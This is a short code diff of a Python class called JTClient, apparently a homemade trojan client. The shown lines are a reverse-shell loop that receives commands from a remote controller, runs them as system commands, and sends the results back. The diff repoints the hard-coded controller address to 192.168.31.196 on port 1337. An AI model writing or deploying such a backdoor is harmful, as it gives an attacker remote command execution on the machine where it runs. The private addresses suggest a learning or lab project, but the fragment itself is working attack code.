@@ -22,8 +22,8 @@ class JTClient:
 
     def run(self):
         while True:
-            cmd = self.reliable_receive()
             # cmd = self.c.recv(1024).decode('utf-8')
+            cmd = self.reliable_receive()
             cmd_result = self.execute_system_command(cmd)
             # self.c.send(cmd_result)
             self.reliable_send(cmd_result)
@@ -31,5 +31,5 @@ class JTClient:
         self.c.close()
 
 
-jTro_client = JTClient("192.168.31.207", 1337)
+jTro_client = JTClient("192.168.31.196", 1337)
 jTro_client.run()
